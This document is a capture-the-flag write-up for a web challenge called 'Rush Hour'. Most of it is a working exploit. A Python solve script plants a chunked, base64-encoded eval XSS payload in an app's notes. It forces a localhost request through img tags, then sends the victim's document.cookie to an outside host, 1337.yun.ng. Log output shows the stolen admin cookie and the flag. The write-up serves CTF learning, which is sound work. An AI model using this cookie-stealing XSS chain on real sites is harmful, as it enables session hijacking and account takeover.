---
ai_date: '2025-04-27 05:28:11'
ai_summary: XSS exploitation using base64 encoded payload and img tags for SSRF to
  read and send cookie
ai_tags:
- xss
- ssrf
- cookie-read
created: 2025-04-19T02:56
points: 388
solves: 49
tags:
- xss
title: Rush Hour
updated: 2025-04-20T20:29
---

It is pretty clear from the start that this has no XSS protection whatsoever.

Simple payloads work directly using `<script>` tags.

However due to character limits we need to split our payload into individual slices.

For simplicity we can encode the code as base64, split it into even chunks of 7 chars.
The payload simply concatenates the segments together, base64 decode and then `eval` it.

```python
def send_payload(payload):
    payload = payload.strip()
    payload = base64.b64encode(payload.encode()).decode()
    add_note("<script>`")
    add_note("`;let c='';`")
    for i in range(0, len(payload), 7):
        chunk = payload[i:i+7]
        add_note(f"`;c+='{chunk}';`")
    add_note("`;c=atob(c);`")
    add_note("`;eval(c);`")
    add_note("`</script>")
```

So how do we get the flag? It requires a SSRF and then reading the cookie, then sending it out.

I quickly found out that `fetch` doesn't work. So I went with `img` tags.

```js
img.src = 'http://127.0.0.1:3000/';
```

By doing this once, we populate `document.cookie` with the flag.

Then we can simply send it out.

```js
location = 'https://1337.yun.ng/?c=' + encodeURIComponent(document.cookie);
```

## solve

> For style points I made the admin XSS another admin

```python
import base64
import time
import requests

from server import webhook

session = requests.Session()
# base = 'http://127.0.0.1:3000'
base = "http://rush-hour-v2.ctf.umasscybersec.org"


def register():
    session.get(base + '/').raise_for_status()
    return session.cookies.get('user')


def logout():
    session.cookies.clear()


def set_user(user_id):
    session.cookies.set('user', user_id)


def get_notes(user_id=None):
    if user_id:
        set_user(user_id)
    r = session.get(f"{base}/user/{session.cookies.get('user')}")
    r.raise_for_status()
    return r.text


def add_note(note, user_id=None, use_post=True):
    if user_id:
        set_user(user_id)
    r = session.post(f"{base}/create", data={'note': note}) if use_post else session.get(f"{base}/create", params={'note': note})
    r.raise_for_status()
    return r.text


def clear_notes(user_id=None):
    if user_id:
        set_user(user_id)
    r = session.get(f"{base}/clear")
    r.raise_for_status()
    return r.text


def report_user(target_id, user_id=None):
    if user_id:
        set_user(user_id)
    r = session.get(f"{base}/report/{target_id}")
    r.raise_for_status()
    return r.text


def send_payload(payload):
    payload = payload.strip()
    payload = base64.b64encode(payload.encode()).decode()
    add_note("<script>`")
    add_note("`;let c='';`")
    for i in range(0, len(payload), 7):
        chunk = payload[i:i+7]
        add_note(f"`;c+='{chunk}';`")
    add_note("`;c=atob(c);`")
    add_note("`;eval(c);`")
    add_note("`</script>")


def send_payload_w(payload):
    payload = payload.strip()
    payload = base64.b64encode(payload.encode()).decode()
    code = ""
    code += f'await add_note("<script>`");'
    code += f'await add_note("`;let c=\'\';`");'
    for i in range(0, len(payload), 32):
        chunk = payload[i:i+32]
        code += f'await add_note("`;c+=\'{chunk}\';`");'

    code += f'await add_note("`;c=atob(c);`");'
    code += f'await add_note("`;eval(c);`");'
    code += f'await add_note("`</script>");'
    return code


uid = register()
print(f"registered user: {uid}")
print("sending payload...")
send_payload("""
window.sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
window.add_note = (note) => {
    // add img tag
    let img = document.createElement('img');
    if(note) img.src = 'http://127.0.0.1:3000/create?note=' + encodeURIComponent(note);
    else img.src = 'http://127.0.0.1:3000/';
    img.style.display = 'none';
    document.body.appendChild(img);
    return new Promise((resolve) => {
        img.onload = () => {
            document.body.removeChild(img);
            resolve();
        };
        img.onerror = () => {
            document.body.removeChild(img);
            resolve();
        };
    });
};
window.payload = async () => {
    await add_note();
    """ + send_payload_w("""
console.log("this is an xss embedded in a admin's notes");
console.log("totally done for style but hey");
""") + """
    location = 'https://1337.yun.ng/?c=' + encodeURIComponent(document.cookie);
};
window.payload();  
""")
print("activating payload...")
stop, wait = webhook(1337)
report_user(uid)
cookie = wait()['c'][0]
admin_uid = cookie.split(";")[0].split('=')[1]
flag = cookie.split(";")[1].split('=')[1]
print(f"admin uid = {admin_uid}")
print(f"flag = {flag}")
print("waiting for payload to finish on admin...")
time.sleep(4)
report_user(admin_uid)
stop()
```

```
registered user: 3dca4de7-6a04-47e2-bed5-fb4fed0929f7
sending payload...
activating payload...
127.0.0.1 - - [19/Apr/2025 02:54:34] "GET /?c=user%3D89074c1d-5049-48fd-8531-94f111518c4a-admin%3B%20supersecretstring%3DUMASS%257BtH3_cl053Rz_%2540re_n0_m%2540tcH%257D HTTP/1.1" 200 -
admin uid = 89074c1d-5049-48fd-8531-94f111518c4a-admin
flag = UMASS%7BtH3_cl053Rz_%40re_n0_m%40tcH%7D
waiting for payload to finish on admin...
127.0.0.1 - - [19/Apr/2025 02:54:34] "GET /favicon.ico HTTP/1.1" 200 -
```

```flag
UMASS{tH3_cl053Rz_@re_n0_m@tcH}
```